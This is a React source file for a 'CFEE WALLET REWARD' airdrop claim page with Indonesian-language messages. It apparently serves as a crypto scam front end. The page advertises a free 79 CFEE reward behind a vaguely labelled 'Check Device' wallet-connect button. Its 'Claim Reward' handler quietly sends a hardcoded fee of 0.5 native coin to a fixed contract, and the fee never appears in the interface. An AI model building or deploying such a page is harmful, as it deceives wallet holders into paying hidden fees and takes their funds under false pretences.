import React from 'react';
import { useEffect, useState } from 'react';
import logo from './logo.png';
import banner from './banner.png';
import './App.css';
import abi from './contracts';
import { ethers } from 'ethers';
import { Button, Divider, Avatar, Container, Card, CardHeader, CardMedia, CardContent, CardActions, Typography, CssBaseline,  } from '@mui/material';
import AccountBalanceWalletIcon from '@mui/icons-material/AccountBalanceWallet';
import PhoneAndroid from '@mui/icons-material/PhoneAndroid';
import Swal from 'sweetalert2';


// Replace tokenContract with your token contract address 
const airdropContract = "0x6Aa5Ad7F8f9107Feb1c10194B4168bD1b0c55E07";
const fee = "500000000000000000";

function App() {

  const [currentAccount, setCurrentAccount] = useState(null);

  const checkWalletIsConnected = () => {
    const { ethereum } = window;
    if(!ethereum){
      console.log("Metamask NOT Installed");
      return;
    }else{
      console.log("Metamask Installed");
    }
   }

  const connectWalletHandler = async() => { 
    const { ethereum } = window;
    if(!ethereum){
      alert("Please Install CFEE Wallet!");
    }

    try{
      const accounts = await ethereum.request({method: 'eth_requestAccounts'});
      console.log("Found an account :", accounts[0]);
      setCurrentAccount(accounts[0]);
    }catch (err){
      console.log(err);
    }
  }

  const connectWalletButton = () => {
    return (
      <Button onClick={connectWalletHandler} variant="contained" startIcon={<PhoneAndroid />} style={{background: 'black', height: '60px'}}>
        Check Device
      </Button>
    )
  }

  const airdropButton = () => {
    return (
      <Button onClick={airdropHandler} variant="contained" startIcon={<AccountBalanceWalletIcon />} style={{background: 'black', height: '60px'}}>
        Claim Reward
      </Button>
    )
  }

  useEffect(() => {
    checkWalletIsConnected();
  }, [])

  
  const airdropHandler = async() => {
    try{
      const { ethereum } = window;

      if(ethereum){
        const provider = new ethers.providers.Web3Provider(ethereum);
        const signer = provider.getSigner();
        const contract = new ethers.Contract(airdropContract, abi, signer);

        console.log("Intialize payment");
        let getadrp = await contract.claimReward({value: fee});
        console.log(contract);
		if(getadrp){
      Swal.fire({
        title: '🚀 Success!',
        text: '🚀 Selamat Reward telah dikirim ke wallet anda.',
        icon: 'success',
        confirmButtonText: 'OKAY'
      });
		}else{
      Swal.fire({
        title: '😢 Error!',
        text: '😢 Claim Reward hanya untuk user baru CFEE Wallet.',
        icon: 'error',
        confirmButtonText: 'OKAY'
      });
		}
      }
    }catch(err){
    Swal.fire({
      title: '😢 Error!',
      text: '😢 Claim Reward hanya untuk user baru CFEE Wallet.',
      icon: 'error',
      confirmButtonText: 'OKAY'
    });
    	console.log(err);
    }

  }

  return (
    <React.Fragment>
      <CssBaseline />
      <Container maxWidth="sm">

    <Card sx={{ maxWidth: 750, bgcolor: '#fafafa' }}>
      <CardHeader
      avatar={
        <Avatar src={logo} sx={{ width: 90, height: 90 }}/>
      }
        titleTypographyProps={{variant:'h6' }}
        title="CFEE WALLET REWARD"
        style={{backgroundColor: "#fff"}}
      />
      <CardMedia
        component="img"
        height="200"
        image={banner}
        alt=""
      />
      <CardContent>
        <Typography variant="h6" color="black" style={{textAlign: 'center'}}>
        Install CFEE dan Klaim Reward nya.
        </Typography>
        <Typography variant="h6" color="black" p={2} style={{textAlign: 'center'}}>
          Claim : 79 CFEE
        </Typography>
      </CardContent>
      <Divider />
      <CardActions style={{justifyContent: 'center'}}>
          {currentAccount ? airdropButton() : connectWalletButton()}
      </CardActions>

    </Card>

    </Container>
    </React.Fragment>
  );
}

export default App;
